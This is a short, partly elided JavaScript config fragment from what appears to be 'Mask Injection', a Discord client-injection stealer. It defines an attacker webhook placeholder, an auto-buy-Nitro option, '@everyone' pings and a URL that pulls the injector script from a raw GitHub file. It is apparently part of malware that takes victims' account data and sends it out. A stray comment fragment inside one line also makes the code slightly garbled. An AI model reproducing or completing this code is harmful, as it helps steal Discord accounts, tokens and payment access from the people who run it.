...
const config = {
  webhook: '%WEBHOOK%', be spammed or deleted
  webhook_protector_key: '%WEBHOOK_KEY%', 
  auto_buy_nitro: false,
  ping_on_run: true,
  ping_val: '@everyone',
  embed_name: 'Mask Injection',
  embed_icon: 'https://cdn.discordapp.com/attachments/1064084096793456751/1088159505801543910/standard.gif'.replace(/ /g, '%20'), 
  embed_color: 5639644, 
  injection_url: 'https://raw.githubusercontent.com/maskreborn/mask-injection/main/injector%20mask.js', 
  /**
    ...
    embeds: [
      {
        ...
        footer: {
          text: '🎉・Discord Injection By github.com/maskreborn・https://github.com/maskreborn/mask-injection',
        },
      },
    ],
  };
